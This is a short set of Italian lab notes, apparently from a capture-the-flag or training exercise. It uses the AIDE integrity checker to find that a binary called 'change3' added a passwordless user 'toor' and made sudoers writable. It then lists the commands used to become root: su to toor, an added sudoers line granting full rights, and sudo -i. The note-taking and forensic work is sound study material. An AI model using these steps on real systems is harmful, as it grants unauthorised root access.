PRIVILEGE ESCALATION
- Configurato aide per eseguire scansione su /etc e /usr/bin
- Effettuata una scansione del filesystem tramite aide, comando: aide -c /home/kali/aide/aide.conf -i
- Eseguire change3
- Effettuatua nuovamente la scansione con aide -c /home/kali/aide/aide.conf -C
- Individuata modifica in /etc/shadow e /etc/passwd ed in /etc/sudoer. Sembra che change3 abbia aggiunto un nuovo utente (toor) con gruppo root
  senza necessità della password ed abbia reso scrivibile il file sudoers dal gruppo di root.
- Diventare utente toor tramite su - toor. Il comando id restituisce: uid=10000(toor) gid=1(daemon) groups=1(daemon)
- Modificare il file /etc/sudoers inserendo la riga: toor    ALL=(ALL:ALL) ALL
- Diventare root tramite: sudo -i
